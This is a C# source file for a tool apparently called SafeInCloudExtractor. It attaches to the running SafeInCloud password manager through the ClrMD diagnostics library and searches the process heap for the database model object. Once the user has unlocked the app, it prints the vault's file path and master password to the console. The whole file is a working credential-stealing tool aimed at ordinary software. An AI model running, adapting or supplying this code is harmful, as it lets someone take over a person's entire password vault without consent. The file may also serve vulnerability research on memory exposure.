using System;
using System.Diagnostics;
using System.Linq;
using Microsoft.Diagnostics.Runtime;
using SafeInCloudExtractor.Properties;

namespace SafeInCloudExtractor
{
	internal class Extractor
	{
		private static Process GetAppProcess()
		{
			return Process.GetProcessesByName(Resources.AppProcessName).FirstOrDefault();
		}

		private static ClrRuntime GetRuntime(Process process)
		{
			DataTarget dataTarget = DataTarget.AttachToProcess(process.Id, 5000, AttachFlag.Passive);
			return dataTarget.ClrVersions?[0].CreateRuntime();
		}

		private static ClrObject GetInfoObject(ClrRuntime runtime, string name)
		{
			return runtime.Heap.EnumerateObjects().FirstOrDefault(obj => obj.Type.Name == name);
		}

		internal void Extract()
		{
			Console.WriteLine(@"SafeInCloudExtractor is working.");
			Process appProcess = GetAppProcess();
			if (appProcess == null)
			{
				Console.WriteLine(@"Couldn't find application process.");
				return;
			}
			Console.WriteLine($@"Found SafeInCloud process. ID: {appProcess.Id}");
			ClrRuntime runtime = GetRuntime(appProcess);
			if (runtime== null)
			{
				Console.WriteLine(@"Couldn't find ClrRuntime.");
				return;
			}
			ClrObject dBModelTypeObj = GetInfoObject(runtime, Resources.DbModelTypeName);

			if (dBModelTypeObj.IsNull)
			{
				Console.WriteLine(@"Couldn't find DatabaseModel type object.");
				return;
			}
			int state;
			try
			{
				state = dBModelTypeObj.GetField<int>(Resources.StateFieldName);
			}
			catch (Exception)
			{
				Console.WriteLine(@"Couldn't find program state.");
				return;
			}
			if (state != 2)
			{
				Console.WriteLine(@"Password must be entered at least once.");
				return;
			}

			string dbPath = dBModelTypeObj.GetStringField(Resources.DbModelDbPathField);
			string password = dBModelTypeObj.GetStringField(Resources.DbModelPasswordField);
			Console.WriteLine($@"Database path: {dbPath}");
			Console.WriteLine($@"Database password: {password}");
		}
	}
}
